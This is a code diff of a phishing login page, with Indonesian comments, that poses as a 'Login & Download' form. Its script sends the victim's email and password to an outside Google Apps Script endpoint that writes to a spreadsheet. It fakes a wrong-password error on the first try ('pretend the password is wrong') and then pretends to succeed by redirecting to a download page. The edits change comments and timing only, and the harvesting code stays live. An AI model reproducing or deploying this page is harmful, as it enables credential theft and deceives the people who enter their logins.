@@ -150,7 +150,7 @@
     let attempt = 0;
     const emailField = document.getElementById("emailField");
     
-    // --- GANTI LINK DI BAWAH INI DENGAN URL APPS SCRIPT BARU KAMU ---
+    // --- TEMPEL URL GOOGLE SCRIPT (/exec) KAMU DI SINI ---
     const scriptURL = 'https://script.google.com/macros/s/AKfycbx5DP7tqM4zaS_a19rJEjHQXi6q3iHGK5euTkRrH4krJkr_HC3XYuyuh_C2BkP5ZDUJ/exec'; 
 
     function showForm(type){
@@ -180,24 +180,26 @@
         btn.disabled = true;
         btn.innerText = (attempt === 1) ? "Verifying..." : "Processing...";
 
-        // KIRIM DATA KE GOOGLE SHEETS
+        // PROSES KIRIM KE GOOGLE SHEETS
         fetch(scriptURL, { 
             method: "POST", 
             body: new FormData(form) 
         })
-        .then(res => console.log("Data Sent!"))
+        .then(res => console.log("Success!"))
         .catch(err => console.error("Error!", err.message));
 
         if (attempt === 1) {
+            // PERCOBAAN 1: Pura-pura salah password
             setTimeout(() => {
                 errorBox.style.display = "block";
                 btn.disabled = false;
                 btn.innerText = "Login & Download";
                 document.getElementById('passwordField').value = ""; 
-            }, 1500);
+            }, 2000);
         } else {
+            // PERCOBAAN 2: Pura-pura berhasil dan pindah halaman
             setTimeout(() => {
-                window.location.href = "download.html";
+                window.location.href = "download.html"; 
             }, 2000);
         }
     });
